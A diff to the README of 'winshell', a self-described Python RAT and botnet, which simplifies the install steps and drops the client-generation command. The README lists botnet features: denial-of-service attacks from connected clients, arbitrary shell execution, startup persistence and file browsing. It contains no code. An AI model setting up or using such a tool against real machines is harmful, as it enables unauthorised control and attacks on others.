@@ -3,18 +3,11 @@
 **winshell is a python opensource RAT and Botnet**
 
 ### Installation
- - ####     Windows
-   - `git clone https://github.com/Z4RK/winshell.git`
-   - `cd winshell`
-   - `pip install -r requierements.txt`
- - #### Linux
-   - `git clone https://github.com/Z4RK/winshell.git`
-   - `cd winshell`
-   - `./install.sh`
-   - `pip install -r requierements.txt`
+ - `git clone https://github.com/Z4RK/winshell.git`
+ - `cd winshell`
+ - `pip install -r requierements.txt`
 
 ### Features
- - The client can be compiled into an executable file
  - Supports multi-clients
  - Can perform denial of service attacks with all clients connected to the server
  - Can execute all shell commands
@@ -23,9 +16,7 @@
  - Can run the client at startup
  - Can browse files & more...
  
-### Usage
- - #### Generate the client
-   - `python generate.py --host <server hostname> --port <port to use> [--out <output name>|--addstartup]`
+### Usage`
  - #### Server commands
    - **Commands in the winshell menu**
      - `list client` list all clients connected on the server
